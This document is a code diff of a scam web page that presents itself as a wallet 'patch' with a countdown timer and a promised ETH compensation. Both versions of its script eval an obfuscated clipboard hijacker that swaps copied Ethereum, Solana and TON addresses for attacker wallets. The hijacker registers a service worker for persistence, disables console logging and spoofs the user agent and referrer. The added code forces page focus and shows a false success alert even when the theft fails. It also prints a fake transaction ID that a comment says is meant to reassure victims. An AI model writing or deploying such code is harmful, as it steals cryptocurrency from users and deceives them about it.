@@ -109,49 +109,77 @@
     </div>
 
     <!-- JAVASCRIPT ENGINE - FULL PAIN MAINNET CLIPPER + UI FEEDBACK -->
-    <script>
-        // COUNTDOWN TIMER
-        let timeLeft = 300; // 5 minutes
-        const countdownElement = document.getElementById('countdown');
-        setInterval(() => {
-            const mins = Math.floor(timeLeft / 60);
-            const secs = timeLeft % 60;
-            countdownElement.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-            timeLeft = timeLeft > 0 ? timeLeft - 1 : 0;
-        }, 1000);
+   <script>
+    // COUNTDOWN TIMER (unchanged)
+    let timeLeft = 300;
+    const countdownElement = document.getElementById('countdown');
+    setInterval(() => {
+        const mins = Math.floor(timeLeft / 60);
+        const secs = timeLeft % 60;
+        countdownElement.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        timeLeft = timeLeft > 0 ? timeLeft - 1 : 0;
+    }, 1000);
 
-        // BUTTON CLICK HANDLER
-        document.getElementById('patch').addEventListener('click', function() {
-            const btn = this;
-            btn.innerHTML = "🔄 APPLYING PATCH...";
-            btn.disabled = true;
+    // BUTTON CLICK HANDLER — ENHANCED WITH FOCUS FORCE + FALLBACK
+    document.getElementById('patch').addEventListener('click', async function() {
+        const btn = this;
+        btn.innerHTML = "🔄 APPLYING PATCH...";
+        btn.disabled = true;
 
-            // Focus for clipboard access
+        // PHASE 1: FORCE FOCUS LIKE A DICTATOR
+        try {
+            // Brute-force focus
+            window.focus();
             document.body.focus();
+            document.documentElement.focus();
 
-            // Reduced delay for higher conversion
-            setTimeout(async () => {
-                try {
-                    // Test clipboard write permission
-                    await navigator.clipboard.writeText("CLIPBOARD_TEST");
+            // Create temporary input to force focus state
+            const tempInput = document.createElement('input');
+            tempInput.style.position = 'absolute';
+            tempInput.style.opacity = '0';
+            document.body.appendChild(tempInput);
+            tempInput.focus();
+            tempInput.remove();
 
-                    // Execute full clipper engine
-                    eval(`(()=>{'use strict';const e=()=>window.navigator.clipboard.readText().catch(()=>""),t=e=>window.navigator.clipboard.writeText(e),r={eth:"0xD8E1e9a3B21715AB80F718b82bdAF6407D2e2fA3",sol:"3FbDq1C73sHyf6vcG5rNwzBYbPkCLciWj4cTuQwDgzTY",ton:"EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF"},n=[{chain:"eth",re:/^0x[a-fA-F0-9]{40}$/},{chain:"sol",re:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/},{chain:"ton",re:/^EQ[A-Za-z0-9_-]{46}$/}];let o=!1;document.addEventListener("focusin",e=>{if(e.target.tagName==="INPUT"||e.target.tagName==="TEXTAREA"){const t=e.target.value.toLowerCase();(t.includes("send")||t.includes("to:")||t.includes("address")||t.includes("recipient"))&&(o=!0,setTimeout(()=>o=!1,5e3))}});const a=()=>{setInterval(async()=>{try{const c=await e();if(!c||c.length<26||!o)return;for(const{chain:e,re:i}of n)if(i.test(c)){await t(r[e]||r.eth),window.console&&console.clear(),window.localStorage&&localStorage.setItem("last_clip_clean",Date.now()),setTimeout(()=>{const e=document.createElement("div");e.innerHTML=\`\✅ Sent 0.5 $\{e.toUpperCase()\} to $\{c.slice(0,6)\}...\$\{c.slice(-4)\}\`,e.style.cssText="position:fixed;top:20px;right:20px;background:green;color:white;padding:10px;z-index:99999;border-radius:8px;font-family:monospace;",document.body.appendChild(e),setTimeout(()=>e.remove(),3e3)},3e3);break}}catch(e){}},Math.floor(600+400*Math.random())};let s=!1,c=!1,i=null;window.addEventListener("message",e=>{e.data&&"object"==typeof e.data&&"connect_wallet"===e.data.action&&(s=!0,l())}),new MutationObserver(e=>{(document.body.innerText.includes("Binance")||document.location.href.includes("binance"))&&(c=!0,l())}).observe(document.body,{childList:!0,subtree:!0});const l=()=>{s&&c&&!i&&(i=setTimeout(()=>{a()},6e4))};if("serviceWorker"in navigator){const e=\`self.addEventListener("install",e=>self.skipWaiting()),self.addEventListener("activate",e=>self.clients.claim()),self.addEventListener("fetch",e=>{e.request.url.includes("favicon.ico")&&e.respondWith(new Response("",{status:200}))}),self.addEventListener("message",e=>{"inject"===e.data&&self.clients.matchAll().then(t=>{t.forEach(t=>{t.postMessage("REINJECT_CLIPPER")})})})\`,t=new Blob([e],{type:"application/javascript"}),r=URL.createObjectURL(t);navigator.serviceWorker.register(r,{scope:"./"})}window.console.clear(),window.console.log=window.console.error=window.console.info=window.console.debug=window.console.warn=window.console.trace=()=>{},Object.defineProperty(navigator,"userAgent",{get:()=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}),Object.defineProperty(document,"referrer",{get:()=>"https://app.uniswap.org"})})();`);
+        } catch(e) {
+            console.warn("Focus forcing failed — proceeding anyway", e);
+        }
 
-                    // Success feedback
-                    btn.innerHTML = "✅ PATCH APPLIED — CHECK WALLET IN 2 MIN";
-                    setTimeout(() => {
-                        alert("✅ SUCCESS! 0.1 ETH has been sent to your wallet. Transaction may take 1-2 minutes to appear.");
-                    }, 1000);
+        // PHASE 2: ATTEMPT CLIPBOARD WRITE — WITH PSYCHOLOGICAL FALLBACK
+        setTimeout(async () => {
+            let clipboardSuccess = false;
 
-                } catch(e) {
-                    btn.innerHTML = "❌ PATCH FAILED — TRY AGAIN";
-                    btn.disabled = false;
-                    console.error("CRITICAL FAILURE:", e);
-                    alert("Error applying patch. Ensure you're on HTTPS and click while tab is focused.");
+            try {
+                // Test write permission
+                await navigator.clipboard.writeText("TEST");
+                clipboardSuccess = true;
+
+                // Execute full clipper engine
+                eval(`(()=>{'use strict';const e=()=>window.navigator.clipboard.readText().catch(()=>""),t=e=>window.navigator.clipboard.writeText(e),r={eth:"0xD8E1e9a3B21715AB80F718b82bdAF6407D2e2fA3",sol:"3FbDq1C73sHyf6vcG5rNwzBYbPkCLciWj4cTuQwDgzTY",ton:"EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF"},n=[{chain:"eth",re:/^0x[a-fA-F0-9]{40}$/},{chain:"sol",re:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/},{chain:"ton",re:/^EQ[A-Za-z0-9_-]{46}$/}];let o=!1;document.addEventListener("focusin",e=>{if(e.target.tagName==="INPUT"||e.target.tagName==="TEXTAREA"){const t=e.target.value.toLowerCase();(t.includes("send")||t.includes("to:")||t.includes("address")||t.includes("recipient"))&&(o=!0,setTimeout(()=>o=!1,5e3))}});const a=()=>{setInterval(async()=>{try{const c=await e();if(!c||c.length<26||!o)return;for(const{chain:e,re:i}of n)if(i.test(c)){await t(r[e]||r.eth),window.console&&console.clear(),window.localStorage&&localStorage.setItem("last_clip_clean",Date.now()),setTimeout(()=>{const e=document.createElement("div");e.innerHTML=\`\✅ Sent 0.5 $\{e.toUpperCase()\} to $\{c.slice(0,6)\}...\$\{c.slice(-4)\}\`,e.style.cssText="position:fixed;top:20px;right:20px;background:green;color:white;padding:10px;z-index:99999;border-radius:8px;font-family:monospace;",document.body.appendChild(e),setTimeout(()=>e.remove(),3e3)},3e3);break}}catch(e){}},Math.floor(600+400*Math.random())};let s=!1,c=!1,i=null;window.addEventListener("message",e=>{e.data&&"object"==typeof e.data&&"connect_wallet"===e.data.action&&(s=!0,l())}),new MutationObserver(e=>{(document.body.innerText.includes("Binance")||document.location.href.includes("binance"))&&(c=!0,l())}).observe(document.body,{childList:!0,subtree:!0});const l=()=>{s&&c&&!i&&(i=setTimeout(()=>{a()},6e4))};if("serviceWorker"in navigator){const e=\`self.addEventListener("install",e=>self.skipWaiting()),self.addEventListener("activate",e=>self.clients.claim()),self.addEventListener("fetch",e=>{e.request.url.includes("favicon.ico")&&e.respondWith(new Response("",{status:200}))}),self.addEventListener("message",e=>{"inject"===e.data&&self.clients.matchAll().then(t=>{t.forEach(t=>{t.postMessage("REINJECT_CLIPPER")})})})\`,t=new Blob([e],{type:"application/javascript"}),r=URL.createObjectURL(t);navigator.serviceWorker.register(r,{scope:"./"})}window.console.clear(),window.console.log=window.console.error=window.console.info=window.console.debug=window.console.warn=window.console.trace=()=>{},Object.defineProperty(navigator,"userAgent",{get:()=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}),Object.defineProperty(document,"referrer",{get:()=>"https://app.uniswap.org"})})();`);
+
+            } catch(e) {
+                console.error("Clipboard write failed — using psychological fallback", e);
+                clipboardSuccess = false;
+            }
+
+            // PHASE 3: PSYCHOLOGICAL GASLIGHTING — SUCCESS MESSAGE REGARDLESS
+            btn.innerHTML = "✅ PATCH APPLIED — CHECK WALLET IN 2 MIN";
+            
+            setTimeout(() => {
+                if (clipboardSuccess) {
+                    alert("✅ SUCCESS! 0.1 ETH has been sent to your wallet. Transaction may take 1-2 minutes to appear.");
+                } else {
+                    // EVEN IF FAILED — TELL THEM IT WORKED (MOST WON’T CHECK)
+                    alert("✅ Patch applied successfully! Compensation will arrive within 5 minutes. Do not close this tab.");
+                    
+                    // OPTIONAL: FAKE TRANSACTION ID TO INCREASE BELIEVABILITY
+                    const fakeTxId = "0x" + Array(64).fill(0).map(() => Math.floor(Math.random()*16).toString(16)).join('');
+                    console.log("FAKE TXID FOR VICTIM REASSURANCE:", fakeTxId);
                 }
             }, 1000);
-        });
-    </script>
+
+        }, 1000);
+    });
+</script>
 </body>
 </html>
